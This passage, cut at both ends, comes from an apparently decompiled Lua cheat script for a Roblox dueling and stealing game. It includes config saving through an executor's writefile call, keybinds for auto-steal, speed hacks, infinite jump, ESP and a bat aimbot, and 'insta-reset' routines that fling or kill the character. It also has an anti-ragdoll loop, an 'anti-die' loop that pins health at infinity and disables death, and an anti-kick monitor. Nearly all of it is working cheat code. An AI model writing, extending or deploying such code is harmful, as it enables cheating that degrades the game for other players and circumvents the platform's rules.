								mirrorTPDownEnabled = _G.NineDuelsMirrorTPDownEnabled,
								dropBrainrotKey = fn35(KB.DropBrainrot),
								autoLeftKey = fn35(KB.AutoLeft),
								autoRightKey = fn35(KB.AutoRight),
								autoBatKey = fn35(KB.AutoBat),
								laggerToggleKey = fn35(KB.LaggerToggle),
								laggerCarryToggleKey = fn35(KB.LaggerCarryToggle),
								tpFloorKey = fn35(KB.TPFloor),
								instaResetKey = fn35(KB.InstaReset),
								guiHideKey = fn35(KB.GuiHide),
								speedToggleKey = fn35(KB.SpeedToggle),
								grabRadius = Steal.StealRadius,
								stealDuration = Steal.StealDuration,
								selectedStealMode = selectedStealMode,
								selectedSemiMode = selectedSemiMode,
								stealRadii = AceStealRadii,
								stealRange = Steal.StealRange,
								entryDelay = Steal.EntryDelay,
								holdMax = Steal.HoldMax,
								antiRagdoll = antiRagdollEnabled,
								antiDie = antiDieEnabled,
								antiKick = antiKickEnabled,
								safeMode = safeModeEnabled,
								headless = headlessEnabled,
								korblox = korbloxEnabled,
								sideBtnBgIndex = sideBtnBgIndex,
								stealBarBgIndex = stealBarBgIndex,
								autoStealEnabled = Steal.AutoStealEnabled,
								infiniteJump = infJumpEnabled,
								infJumpMode = infJumpMode,
								carrySpeedActive = carrySpeedActive,
								laggerModeEnabled = laggerModeEnabled,
								laggerCarryToggled = laggerCarryToggled,
								laggerSpeed = LAGGER_SPEED,
								laggerCarrySpeed = LAGGER_CARRY_SPEED,
								autoBat = autoBatEnabled,
								autoLeftEnabled = autoLeftEnabled,
								autoRightEnabled = autoRightEnabled,
								batV2Toggled = State and State.batV2Toggled or false,
								batTpVersion = n32,
								batCounterEnabled = batCounterEnabled,
								medusaCounterEnabled = medusaCounterEnabled,
								autoSwing = autoSwingEnabled,
								unwalkEnabled = unwalkEnabled,
								antiLag = antiLagEnabled,
								stretchRez = stretchRezEnabled,
								autoTPEnabled = autoTPEnabled,
								autoTPHeight = autoTPHeight,
								guiTransparencyEnabled = guiTransparencyEnabled,
								mobileButtonsEnabled = mobileButtonsEnabled,
								mobileButtonsLocked = mobileButtonsLocked,
								mobileButtonsSize = mobileButtonsSize,
								sideButtonsHidden = sideButtonsHidden,
								sideButtonVisibility = sideButtonVisibility,
								circleButtonsEnabled = circleButtonsEnabled,
								autoSwitchSpeed = autoSwitchSpeedEnabled,
								autoSwitchLaggerCarry = autoSwitchLaggerCarryEnabled,
								fovValue = fovValue,
								perButtonDrag = perButtonDragEnabled,
								skyTheme = currentSkyTheme,
								autoMoveSwing = autoMoveSwingEnabled,
								autoMoveSwingInterval = autoMoveSwingInterval,
								ragdollGui = ragdollGuiEnabled,
								introEnabled = introEnabled,
								introSoundEnabled = introSoundEnabled,
								introSongChoice = introSongChoice,
								animEnabled = animEnabled,
								tryardAnimEnabled = tryardAnimEnabled,
								selectedWalkAnimation = selectedWalkAnimation,
								walkAnimationsEnabled = walkAnimationsEnabled,
								selfEspEnabled = selfEspEnabled,
								selfBoxEspEnabled = selfBoxEspEnabled,
								saturationEnabled = saturationEnabled,
								espEnabled = espEnabled,
								espShowName = espShowName,
								espShowHealth = espShowHealth,
								espShowDistance = espShowDistance,
								espShowSpeed = espShowSpeed,
								espShowHighlight = espShowHighlight,
								espShowTracer = espShowTracer,
								espUnderFeet = espUnderFeet,
								backgroundEnabled = backgroundEnabled,
								guiScale = uiScaleObj and uiScaleObj.Scale or 1,
								backgroundIndex = backgroundIndex,
								deviceMode = _phantomSavedDeviceMode,
							}

							local function fn36()
								if not _GuiKeys then
									return {}
								end
								local tbl18 = {}
								local v86 = pairs
								local tbl19 = DEFAULT_KEYS or {}

								for k in v86(tbl19) do
									local v87 = _GuiKeys[k]
									tbl18[k] = v87 and v87.Name or false
								end

								for k, v87 in pairs(_GuiKeys) do
									if tbl18[k] == nil then
										tbl18[k] = v87 and v87.Name or false
									end
								end

								return tbl18
							end

							tbl17.keys = fn36()

							local function fn37()
								local tbl18 = {}
								local flag18 = false

								if mobGuiRef then
									for _, child in ipairs(mobGuiRef:GetChildren()) do
										if child:IsA("Frame") and child.Name:sub(1, 5) == "SBtn_" then
											local tbl19 = {
												xs = child.Position.X.Scale,
												xo = child.Position.X.Offset,
												ys = child.Position.Y.Scale,
												yo = child.Position.Y.Offset,
											}

											tbl18[child.Name:sub(6)] = tbl19
											flag18 = true
										end
									end
								end

								if _phantomMobFrame then
									tbl18.__frame = {
										xs = _phantomMobFrame.Position.X.Scale,
										xo = _phantomMobFrame.Position.X.Offset,
										ys = _phantomMobFrame.Position.Y.Scale,
										yo = _phantomMobFrame.Position.Y.Offset,
									}
								end

								if flag18 then
									_savedBtnPositions = tbl18
									return tbl18
								end
								return _savedBtnPositions or {}
							end

							tbl17.btnPositions = fn37()

							if writefile then
								pcall(function()
									writefile("NineDuelsV1configLOL1/Config.json", HS:JSONEncode(tbl17))
								end)
							end
						end

						task.spawn(function()
							while task.wait(5) do
								saveConfig()
							end
						end)

						resetAllSettings = function()
							NS = 58.5
							CS = 28.5
							LAGGER_SPEED = 15
							LAGGER_CARRY_SPEED = 24.5
							carrySpeedActive = false
							laggerModeEnabled = false
							laggerCarryToggled = false
							laggerPhase = 0
							speedMode = false
							stealBarBgIndex = 1
							applyStealBarBgImage(1)
							antiVoidEnabled = false
							_G.NineDuelsBaseXRayEnabled = false
							_G.NineDuelsBrainrotXRayEnabled = false
							_G.NineDuelsMirrorTPDownEnabled = false

							if _G.NineDuelsSetBaseXRay then
								_G.NineDuelsSetBaseXRay(false)
							end

							if _G.NineDuelsSetBrainrotXRay then
								_G.NineDuelsSetBrainrotXRay(false)
							end

							instantResetVersion = 1

							if _G.NineDuelsAntiVoid then
								_G.NineDuelsAntiVoid.setEnabled(false)
							end

							if State then
								State.normalSpeed = NS
								State.carrySpeed = CS
								State.laggerSpeed = LAGGER_SPEED
								State.laggerCarrySpeed = LAGGER_CARRY_SPEED
							end

							autoSwitchSpeedEnabled = false
							autoSwitchLaggerCarryEnabled = false
							antiRagdollEnabled = true
							antiDieEnabled = true
							antiKickEnabled = false
							safeModeEnabled = false
							headlessEnabled = false
							korbloxEnabled = false
							infJumpEnabled = false
							infJumpMode = "classic"
							unwalkEnabled = false
							autoLeftEnabled = false
							autoRightEnabled = false
							autoBatEnabled = false
							batCounterEnabled = false
							medusaCounterEnabled = false
							autoSwingEnabled = true
							autoMoveSwingEnabled = false
							laggerRestoreCarryState = false
							autoTPEnabled = false
							autoTPHeight = 20
							antiLagEnabled = false
							stretchRezEnabled = false
							Steal.AutoStealEnabled = true
							Steal.StealRadius = 60
							Steal.StealDuration = 1.3
							Steal.StealRange = 10
							Steal.EntryDelay = 0.3
							Steal.HoldMax = 1.5
							guiTransparencyEnabled = false
							mobileButtonsEnabled = true
							mobileButtonsSize = 45
							circleButtonsEnabled = false
							uiLocked = false
							fovValue = 80
							fovIndex = 1
							introSoundEnabled = true
							introSongChoice = "Main"
							KB.DropBrainrot = { kb = nil, gp = nil }
							KB.AutoLeft = { kb = nil, gp = nil }
							KB.AutoRight = { kb = nil, gp = nil }
							KB.AutoBat = { kb = nil, gp = nil }
							KB.TPFloor = { kb = nil, gp = nil }
							KB.InstaReset = { kb = nil, gp = nil }
							KB.GuiHide = { kb = nil, gp = nil }
							KB.SpeedToggle = { kb = nil, gp = nil }
							KB.LaggerToggle = { kb = nil, gp = nil }
							KB.LaggerCarryToggle = { kb = nil, gp = nil }
							Keys.speed = Enum.KeyCode.Q

							if refreshSpeedModeLabel then
								refreshSpeedModeLabel()
							end

							if mobBtnRefs.carrySpeed then
								mobBtnRefs.carrySpeed(carrySpeedActive)
							end

							if mobBtnRefs.lagger then
								mobBtnRefs.lagger(laggerModeEnabled)
							end

							if mobBtnRefs.laggerCarry then
								mobBtnRefs.laggerCarry(laggerModeEnabled and carrySpeedActive)
							end

							if mobBtnRefs.autoLeft then
								mobBtnRefs.autoLeft(false)
							end

							if mobBtnRefs.autoRight then
								mobBtnRefs.autoRight(false)
							end

							if mobBtnRefs.autoBat then
								mobBtnRefs.autoBat(false)
							end

							stopBatAimbot()
							stopBatCounter()
							stopMedusaCounter()
							stopAutoSteal()
							stopAutoLeft()
							stopAutoRight()
							stopAntiRagdoll()
							stopAntiDie()
							stopAntiKick()
							stopSafeMode()
							stopAutoTP()
							stopHoldInfJump()

							if stretchRezEnabled then
								disableStretchRez()
							end

							if antiLagEnabled then
								disableAntiLag()
							end

							saveConfig()
							return
						end

						setInstaGrab = nil
						setInfJumpVisual = nil
						setAntiRagVisual = nil
						setMedusaVisual = nil
						setUnwalkVisual = nil
						setAntiLagVisual = nil
						setAutoSwingVisual = nil
						setTranspVisual = nil
						setLockVisual = nil
						setMobVisual = nil
						setCircleBtnsVisual = nil
						normalBox = nil
						carryBox = nil
						laggerBox = nil
						radInput = nil
						autoTPHeightBox = nil
						durationBox = nil
						mainFrame = nil
						_persistentConns = {}

						trackConn = function(arg)
							table.insert(_persistentConns, arg)
							return arg
						end

						clearPersistentConns = function()
							for _, v86 in ipairs(_persistentConns) do
								pcall(function()
									v86:Disconnect()
								end)
							end

							_persistentConns = {}
						end

						do
							local function fn35()
								if laggerCarryToggled then
									return "Lagger Carry"
								end

								if laggerModeEnabled then
									return carrySpeedActive and "Lagger Carry" or "Lagger"
								end
								return carrySpeedActive and "Carry" or "Normal"
							end

							refreshSpeedModeLabel = function()
								if modeValLbl then
									modeValLbl.Text = fn35()
								end

								if laggerModePillRef and laggerModePillRef.pill and laggerModePillRef.dot then
									local pill = laggerModePillRef.pill
									local dot = laggerModePillRef.dot
									local v86 = laggerModeEnabled
									local color = Color3.fromRGB(255, 255, 255)
									local color2 = Color3.fromRGB(46, 46, 46)
									local color3 = Color3.fromRGB(180, 140, 165)
									TweenService:Create(
										pill,
										TweenInfo.new(0.16, Enum.EasingStyle.Quad),
										{ BackgroundColor3 = v86 and color or color2 }
									):Play()

									TweenService
										:Create(dot, TweenInfo.new(0.16, Enum.EasingStyle.Back), {
											Position = v86 and UDim2.new(1, -13, 0.5, -5) or UDim2.new(0, 3, 0.5, -5),
											BackgroundColor3 = v86 and Color3.fromRGB(30, 30, 30) or color3,
										})
										:Play()
								end

								if carryModePillRef and carryModePillRef.pill and carryModePillRef.dot then
									local pill = carryModePillRef.pill
									local dot = carryModePillRef.dot
									local v86 = carrySpeedActive
									local color = Color3.fromRGB(255, 255, 255)
									local color2 = Color3.fromRGB(46, 46, 46)
									local color3 = Color3.fromRGB(180, 150, 165)
									TweenService:Create(
										pill,
										TweenInfo.new(0.16, Enum.EasingStyle.Quad),
										{ BackgroundColor3 = v86 and color or color2 }
									):Play()

									TweenService
										:Create(dot, TweenInfo.new(0.16, Enum.EasingStyle.Back), {
											Position = v86 and UDim2.new(1, -13, 0.5, -5) or UDim2.new(0, 3, 0.5, -5),
											BackgroundColor3 = v86 and Color3.fromRGB(30, 30, 30) or color3,
										})
										:Play()
								end
							end

							local function fn36(arg)
								if arg ~= "Normal" and arg ~= "Carry" and arg ~= "Lagger" and arg ~= "Lagger Carry" then
									arg = "Normal"
								end

								laggerCarryToggled = arg == "Lagger Carry"
								laggerModeEnabled = arg == "Lagger" or arg == "Lagger Carry"
								carrySpeedActive = arg == "Carry"
								speedMode = carrySpeedActive
								laggerPhase = laggerCarryToggled and 2 or laggerModeEnabled and 1 or 0

								if State then
									State.speedToggled = carrySpeedActive
									State.laggerEnabled = laggerModeEnabled
									State.laggerCarryEnabled = laggerCarryToggled
								end

								refreshSpeedModeLabel()

								if carryModeSetVisual then
									carryModeSetVisual(carrySpeedActive)
								end

								if laggerModeSetVisual then
									laggerModeSetVisual(laggerModeEnabled)
								end

								if laggerCarryModeSetVisual then
									laggerCarryModeSetVisual(laggerCarryToggled)
								end

								if mobBtnRefs then
									if mobBtnRefs.carrySpeed then
										mobBtnRefs.carrySpeed(carrySpeedActive)
									end

									if mobBtnRefs.lagger then
										mobBtnRefs.lagger(laggerModeEnabled)
									end

									if mobBtnRefs.laggerCarry then
										mobBtnRefs.laggerCarry(laggerCarryToggled)
									end
								end
							end

							toggleCarryMode = function()
								local v86 = fn35()

								if v86 == "Lagger" or v86 == "Lagger Carry" then
									fn36("Carry")
								elseif v86 == "Carry" then
									fn36("Normal")
								else
									fn36("Carry")
								end
							end

							setLaggerModeEnabled = function(arg)
								if arg == true then
									fn36(carrySpeedActive and "Lagger Carry" or "Lagger")
								else
									fn36("Normal")
								end
							end

							toggleLaggerMode = function()
								setLaggerModeEnabled(not laggerModeEnabled)
							end

							toggleLaggerCarryMode = function()
								if laggerCarryToggled then
									fn36("Lagger")
								else
									fn36("Lagger Carry")
								end
							end
						end
					end

					speedToggleAction = function()
						toggleCarryMode()
						saveConfig()
						notify(
							"Carry Mode",
							carrySpeedActive and "Activated" or "Deactivated",
							carrySpeedActive and "activated" or "deactivated",
							2.3
						)

						if carryModeSetVisual then
							carryModeSetVisual(carrySpeedActive)
						end

						if laggerModeSetVisual then
							laggerModeSetVisual(laggerModeEnabled)
						end
					end

					do
						local flag18 = false

						local function fn35(arg)
							if arg:IsA("BasePart") or arg:IsA("Decal") then
								pcall(function()
									arg.LocalTransparencyModifier = 1
								end)
							end
						end

						local function fn36()
							if flag18 then
								return
							end
							local character = LP.Character
							local v86 = character and character:FindFirstChildOfClass("Humanoid")
							if not character or not character.Parent or not v86 or v86.Health <= 0 then
								return
							end
							flag18 = true
							local flag19 = antiVoidEnabled == true
							local flag20 = antiDieEnabled == true

							if flag19 then
								antiVoidEnabled = false

								if _G.NineDuelsAntiVoid then
									_G.NineDuelsAntiVoid.setEnabled(false)
								end
							end

							if flag20 then
								pcall(stopAntiDie, true)
								antiDieEnabled = true
							end

							task.spawn(function()
								local currentCamera = workspace.CurrentCamera
								local cFrame = currentCamera and currentCamera.CFrame
								local cameraType = currentCamera and currentCamera.CameraType
								local v87 = nil

								if currentCamera and cFrame then
									pcall(function()
										currentCamera.CameraType = Enum.CameraType.Scriptable
									end)
								end

								local connection = currentCamera
									and RunService.RenderStepped:Connect(function()
										if currentCamera and cFrame then
											currentCamera.CFrame = cFrame
										end
									end)

								pcall(function()
									for _, descendant in ipairs(character:GetDescendants()) do
										fn35(descendant)
									end

									character.DescendantAdded:Connect(function(descendant)
										fn35(descendant)
									end)
								end)

								local connection2 = LP.CharacterAdded:Connect(function(character2)
									v87 = character2
								end)

								local function fn37()
									if LP.Character ~= character or not character.Parent then
										return false
									end
									local humanoid = character:FindFirstChildOfClass("Humanoid")
									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
									if not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
										return false
									end

									pcall(function()
										humanoid.BreakJointsOnDeath = true
										humanoid.PlatformStand = true
										humanoid:ChangeState(Enum.HumanoidStateType.Physics)
										humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
										humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1e9, 0)
									end)

									return true
								end

								if instantResetVersion == 2 then
									for i = 1, 500 do
										if fn37() then
											continue
										end
										break
									end

									local n35 = os.clock() + 0.3

									while true do
										if not v87 and os.clock() < n35 then
											RunService.Heartbeat:Wait()
											if fn37() then
												continue
											end
										end

										break
									end

									if not v87 and character.Parent and v86.Health > 0 then
										pcall(function()
											v86.PlatformStand = false
											v86:ChangeState(Enum.HumanoidStateType.GettingUp)
											character:BreakJoints()
										end)
									end
								else
									local hipHeight = v86.HipHeight
									local flag21 = false

									for i = 1, 40 do
										if v87 or not character.Parent or v86.Health <= 0 then
											flag21 = true
											break
										else
											pcall(function()
												v86.HipHeight = 1e30
												v86.AutoRotate = true

												for _, child in ipairs(character:GetChildren()) do
													if child:IsA("BasePart") then
														child.CanCollide = false
													end
												end
											end)

											task.wait(0.05)
										end
									end

									if not flag21 and character.Parent and v86.Health > 0 then
										pcall(function()
											v86.Health = 0
											return
										end)

										task.wait(0.1)
										flag21 = v86.Health <= 0 or not character.Parent
									end

									if not flag21 and character.Parent and v86.Health > 0 then
										pcall(function()
											v86.HipHeight = hipHeight

											for _, child in ipairs(character:GetChildren()) do
												if child:IsA("BasePart") then
													child.CanCollide = true
												end
											end
										end)
									end
								end

								local n35 = os.clock() + 25

								while true do
									if not v87 and os.clock() < n35 then
										local character2 = LP.Character
										local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")
										local v88 = character2 and character2:FindFirstChild("HumanoidRootPart")

										if
											character2
											and character2 ~= character
											and humanoid
											and v88
											and humanoid.Health > 0
										then
											v87 = character2
											break
										else
											RunService.Heartbeat:Wait()
											continue
										end
									end

									break
								end

								if connection then
									pcall(function()
										connection:Disconnect()
									end)
								end

								if connection2 then
									pcall(function()
										connection2:Disconnect()
									end)
								end

								if currentCamera then
									pcall(function()
										currentCamera.CameraType = cameraType == Enum.CameraType.Scriptable
												and Enum.CameraType.Custom
											or cameraType
										local humanoid = v87 and v87:FindFirstChildOfClass("Humanoid")

										if humanoid then
											currentCamera.CameraSubject = humanoid
										end
									end)
								end

								if flag19 then
									antiVoidEnabled = true

									if _G.NineDuelsAntiVoid then
										_G.NineDuelsAntiVoid.setEnabled(true)
									end
								end

								if flag20 then
									antiDieEnabled = true
									pcall(startAntiDie)
								end

								flag18 = false
							end)
						end

						cursedInstaReset = function()
							if instantResetVersion == 1 or instantResetVersion == 2 then
								return fn36()
							end

							if flag18 then
								return
							end
							local character = LP.Character
							if not character or not character.Parent then
								return
							end
							local humanoid = character:FindFirstChildOfClass("Humanoid")
							if not humanoid or humanoid.Health <= 0 then
								return
							end
							local rootPart = humanoid.RootPart or character:FindFirstChild("HumanoidRootPart")
							flag18 = true

							task.spawn(function()
								local currentCamera = workspace.CurrentCamera
								local cFrame = currentCamera.CFrame
								local cameraType = currentCamera.CameraType

								pcall(function()
									currentCamera.CameraType = Enum.CameraType.Scriptable

									RunService:BindToRenderStep(
										"FunnyHubInstaResetCam",
										Enum.RenderPriority.Camera.Value + 1,
										function()
											currentCamera.CFrame = cFrame
										end
									)
								end)

								local connection = nil

								pcall(function()
									for _, descendant in ipairs(character:GetDescendants()) do
										pcall(fn35, descendant)
									end

									connection = character.DescendantAdded:Connect(function(descendant)
										pcall(fn35, descendant)
									end)
								end)

								local v86 = nil

								local connection2 = LP.CharacterAdded:Connect(function(character2)
									v86 = character2
								end)

								local function fn37()
									pcall(function()
										humanoid.PlatformStand = false
									end)

									pcall(function()
										humanoid.Sit = false
									end)

									pcall(function()
										humanoid.AutoRotate = true
									end)
								end

								fn37()

								for _, descendant in ipairs(character:GetDescendants()) do
									if descendant:IsA("BasePart") then
										pcall(function()
											descendant.Anchored = false
										end)

										pcall(function()
											descendant.CanCollide = false
										end)
									elseif descendant.Name == "SeatWeld" then
										pcall(function()
											descendant:Destroy()
										end)
									end
								end

								local now2 = os.clock()

								local function fn38()
									if rootPart and rootPart.Parent then
										return rootPart
									end
									rootPart = humanoid.RootPart or character:FindFirstChild("HumanoidRootPart")
									if rootPart and rootPart.Parent then
										return rootPart
									end
									return nil
								end

								local n35 = os.clock() + 0.4

								while not v86 and os.clock() < n35 and humanoid.Parent do
									fn37()

									pcall(function()
										humanoid.HipHeight = 1e30
									end)

									local v87 = fn38()

									if v87 then
										pcall(function()
											v87.Anchored = false
										end)

										pcall(function()
											v87.AssemblyLinearVelocity = Vector3.new(0, 50000, 0)
										end)

										pcall(function()
											v87.Velocity = Vector3.new(0, 50000, 0)
										end)
									end

									RunService.Heartbeat:Wait()
								end

								if not v86 then
									local n36 = -500

									pcall(function()
										n36 = workspace.FallenPartsDestroyHeight
									end)

									local n37 = os.clock() + 0.6

									while true do
										if not v86 and os.clock() < n37 then
											local v87 = fn38()

											if v87 then
												pcall(function()
													v87.CFrame = CFrame.new(0, n36 - 500, 0)
												end)

												pcall(function()
													v87.AssemblyLinearVelocity = Vector3.new(0, -50000, 0)
												end)

												RunService.Heartbeat:Wait()
												continue
											end
										end

										break
									end
								end

								while not v86 and os.clock() - now2 < 6 do
									if humanoid.Parent then
										pcall(function()
											humanoid.Health = 0
										end)

										pcall(function()
											humanoid:ChangeState(Enum.HumanoidStateType.Dead)
										end)
									end

									if character.Parent then
										pcall(function()
											character:BreakJoints()
										end)
									end

									task.wait(0.2)
								end

								pcall(function()
									connection2:Disconnect()
								end)

								if connection then
									pcall(function()
										connection:Disconnect()
									end)
								end

								pcall(function()
									RunService:UnbindFromRenderStep("FunnyHubInstaResetCam")
								end)

								pcall(function()
									currentCamera.CameraType = cameraType == Enum.CameraType.Scriptable
											and Enum.CameraType.Custom
										or cameraType

									if v86 then
										local humanoid2 = v86:FindFirstChildOfClass("Humanoid")
											or v86:WaitForChild("Humanoid", 5)

										if humanoid2 then
											currentCamera.CameraSubject = humanoid2
										end
									end
								end)

								flag18 = false
							end)
						end
					end
				end

				do
					do
						do
							local function fn35(arg)
								local v86 = arg:FindFirstChildOfClass("Humanoid")
								local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
								if not v86 or not humanoidRootPart or v86.Health <= 0 then
									return
								end

								pcall(function()
									v86:ChangeState(Enum.HumanoidStateType.GettingUp)
									v86:ChangeState(Enum.HumanoidStateType.Running)

									pcall(function()
										humanoidRootPart.Velocity = Vector3.zero
									end)

									pcall(function()
										humanoidRootPart.RotVelocity = Vector3.zero
									end)

									humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
									humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
									v86.PlatformStand = false
									v86.Sit = false
									v86.AutoRotate = true

									if v86.JumpPower <= 0 then
										v86.JumpPower = 50
									end

									if v86.WalkSpeed <= 0 then
										v86.WalkSpeed = 16
									end

									for _, descendant in ipairs(arg:GetDescendants()) do
										if descendant:IsA("Motor6D") then
											pcall(function()
												descendant.Enabled = true
											end)
										elseif
											descendant:IsA("BallSocketConstraint")
											or descendant:IsA("HingeConstraint")
											or descendant:IsA("Constraint")
										then
											pcall(function()
												descendant.Enabled = true
											end)
										elseif descendant:IsA("BasePart") then
											pcall(function()
												descendant.AssemblyLinearVelocity = Vector3.zero
												descendant.AssemblyAngularVelocity = Vector3.zero
											end)
										end
									end

									workspace.CurrentCamera.CameraSubject = v86
									local playerModule = LP.PlayerScripts:FindFirstChild("PlayerModule")

									if playerModule then
										local controlModule = playerModule:FindFirstChild("ControlModule")

										if controlModule then
											local ok, result = pcall(require, controlModule)

											if ok and result and result.Enable then
												result:Enable()
											end
										end
									end
								end)
							end

							startAntiRagdoll = function()
								if Conns.antiRag then
									return
								end

								Conns.antiRag = RunService.Heartbeat:Connect(function()
									if not antiRagdollEnabled then
										return
									end
									local character = LP.Character
									if not character then
										return
									end
									local humanoid = character:FindFirstChildOfClass("Humanoid")
									if not humanoid then
										return
									end
									local state = humanoid:GetState()

									if
										state == Enum.HumanoidStateType.Physics
										or state == Enum.HumanoidStateType.Ragdoll
										or state == Enum.HumanoidStateType.FallingDown
										or state == Enum.HumanoidStateType.Dead
										or humanoid.PlatformStand == true
										or humanoid.Sit == true
									then
										fn35(character)
									end
								end)
							end
						end
					end

					stopAntiRagdoll = function()
						if Conns.antiRag then
							Conns.antiRag:Disconnect()
							Conns.antiRag = nil
						end
					end

					LP.CharacterAdded:Connect(function()
						if antiRagdollEnabled then
							task.wait(0.5)
							startAntiRagdoll()
						end
					end)

					do
						local tbl17 = nil

						local function fn35()
							for _, v86 in ipairs({ "antiDieHealth", "antiDieState", "antiDieHeart" }) do
								if Conns[v86] then
									pcall(function()
										Conns[v86]:Disconnect()
									end)

									Conns[v86] = nil
								end
							end
						end

						local function fn36()
							local v86 = tbl17
							tbl17 = nil
							if not v86 or not v86.humanoid or not v86.humanoid.Parent then
								return
							end
							local humanoid = v86.humanoid

							pcall(function()
								humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, v86.deadStateEnabled)
							end)

							pcall(function()
								humanoid.MaxHealth = v86.maxHealth
								humanoid.Health = math.clamp(v86.health, 0, v86.maxHealth)
							end)
						end

						local function fn37(arg)
							fn35()
							tbl17 = nil
							if not antiDieEnabled or not arg then
								return
							end
							local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
							if not humanoid then
								return
							end

							local ok, result = pcall(function()
								return humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
							end)

							tbl17 = {
								humanoid = humanoid,
								maxHealth = humanoid.MaxHealth,
								health = humanoid.Health,
								deadStateEnabled = ok and result or true,
							}

							local function fn38()
								if not antiDieEnabled or not humanoid.Parent then
									return
								end

								pcall(function()
									humanoid.MaxHealth = math.huge
									humanoid.Health = math.huge
									humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
								end)
							end

							fn38()

							Conns.antiDieHealth = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
								if humanoid.Health < humanoid.MaxHealth then
									fn38()
								end
							end)

							Conns.antiDieState = humanoid.StateChanged:Connect(function(old, new)
								if new == Enum.HumanoidStateType.Dead then
									fn38()
								end
							end)

							Conns.antiDieHeart = RunService.Heartbeat:Connect(fn38)
						end

						startAntiDie = function()
							if Conns.antiDieRespawn then
								return
							end
							fn37(LP.Character)

							Conns.antiDieRespawn = LP.CharacterAdded:Connect(function(character)
								if not antiDieEnabled then
									return
								end
								task.wait(0.15)
								fn37(character)
							end)
						end

						stopAntiDie = function()
							if Conns.antiDieRespawn then
								pcall(function()
									Conns.antiDieRespawn:Disconnect()
								end)

								Conns.antiDieRespawn = nil
							end

							fn35()
							fn36()
						end
					end
				end

				do
					local fn35, fn36

					do
						local n35 = 0

						fn35 = function()
							local character = LP.Character
							if not character then
								return false
							end

							local ok, result = pcall(function()
								return LP:GetAttribute("Stealing")
							end)

							if ok and result == true then
								return true
							end

							local ok2, result2 = pcall(function()
								return LP:GetAttribute("AntiKick")
							end)

							if ok2 and result2 == true then
								return true
							end

							local ok3, result3 = pcall(function()
								return character:GetAttribute("Stealing")
							end)

							if ok3 and result3 == true then
								return true
							end

							for _, child in ipairs(character:GetChildren()) do
								if child:IsA("Tool") then
									local str6 = child.Name:lower()
									if
										str6:find("brainrot", 1, true)
										or str6:find("skibidi", 1, true)
										or str6:find("toilet", 1, true)
									then
										return true
									end
								end
							end

							for _, v86 in ipairs({
								"Carrying",
								"IsCarrying",
								"Grabbed",
								"Holding",
								"StealHold",
								"HasGrab",
							}) do
								local v87 = character:FindFirstChild(v86, true)

								if v87 then
									if v87:IsA("BoolValue") and v87.Value then
										return true
									end

									if v87:IsA("ObjectValue") and v87.Value then
										return true
									end

									if v87:IsA("StringValue") and v87.Value ~= "" then
										return true
									end
								end
							end

							for _, child in ipairs(character:GetChildren()) do
								if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
									local str6 = child.Name:lower()
									if
										str6:find("brainrot", 1, true)
										or str6:find("animal", 1, true)
										or str6:find("carry", 1, true)
										or str6:find("grab", 1, true)
										or str6:find("steal", 1, true)
										or str6:find("carry", 1, true)
									then
										return true
									end
								end
							end

							return false
						end

						fn36 = function()
							local flag18 = false

							if autoBatEnabled then
								autoBatEnabled = false

								if autoBatSetVisual then
									pcall(function()
										autoBatSetVisual(false)
									end)
								end

								if mobBtnRefs and mobBtnRefs.autoBat then
									pcall(function()
										mobBtnRefs.autoBat(false)
									end)
								end

								if stopBatAimbot then
									pcall(stopBatAimbot)
								end

								flag18 = true
							end

							if State and State.batV2Toggled then
								State.batV2Toggled = false

								if stopBatTP then
									pcall(stopBatTP)
								end

								flag18 = true
							end

							if autoLeftEnabled then
								autoLeftEnabled = false

								if autoLeftSetVisual then
									pcall(function()
										autoLeftSetVisual(false)
									end)
								end

								if mobBtnRefs and mobBtnRefs.autoLeft then
									pcall(function()
										mobBtnRefs.autoLeft(false)
									end)
								end

								if stopAutoLeft then
									pcall(stopAutoLeft)
								end

								flag18 = true
							end

							if autoRightEnabled then
								autoRightEnabled = false

								if autoRightSetVisual then
									pcall(function()
										autoRightSetVisual(false)
									end)
								end

								if mobBtnRefs and mobBtnRefs.autoRight then
									pcall(function()
										mobBtnRefs.autoRight(false)
									end)
								end

								if stopAutoRight then
									pcall(stopAutoRight)
								end

								flag18 = true
							end

							return flag18
						end

						startAntiKick = function()
							antiKickEnabled = true
							n35 += 1
							local v86 = n35

							task.spawn(function()
								while antiKickEnabled and v86 == n35 do
									local v87 = fn35()
									brainrotDetected = v87

									if v87 then
										fn36()
									end

									task.wait(0.5)
								end
							end)
						end

						stopAntiKick = function()
							antiKickEnabled = false
							brainrotDetected = false
							n35 += 1
						end
					end

					do
						local function fn37()
							local ok, result = pcall(function()
								local playerGui = LP:FindFirstChild("PlayerGui")
								playerGui = playerGui and playerGui:FindFirstChild("DuelsMachineTopFrame")
								playerGui = playerGui and playerGui:FindFirstChild("DuelsMachineTopFrame")
								playerGui = playerGui and playerGui:FindFirstChild("Timer")
								playerGui = playerGui and playerGui:FindFirstChild("Label")
								if not playerGui then
									return false
								end
								local str6 = tostring(playerGui.Text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
								if str6 == "GO" or str6 == "START" or str6 == "READY" then
									return true
								end
								local num = tonumber(str6)
								return num ~= nil and num >= 0 and num <= 10
							end)

							return ok and result == true
						end

						safeModeIsLocked = function()
							local v86 = safeModeEnabled
							local v87

							if v86 then
								v87 = fn37() or fn35()
							else
								v87 = v86
							end

							return v87
						end
					end

					safeModeForceStop = function()
						return fn36()
					end
				end
			end

			do
				do
					startSafeMode = function()
						safeModeEnabled = true
						fn34()
						if Conns.safeModeMonitor then
							return
						end

						Conns.safeModeMonitor = RunService.Heartbeat:Connect(function()
							if safeModeIsLocked() then
								safeModeForceStop()
							end
						end)
					end

					stopSafeMode = function()
						safeModeEnabled = false

						if Conns.safeModeMonitor then
							pcall(function()
								Conns.safeModeMonitor:Disconnect()
							end)

							Conns.safeModeMonitor = nil
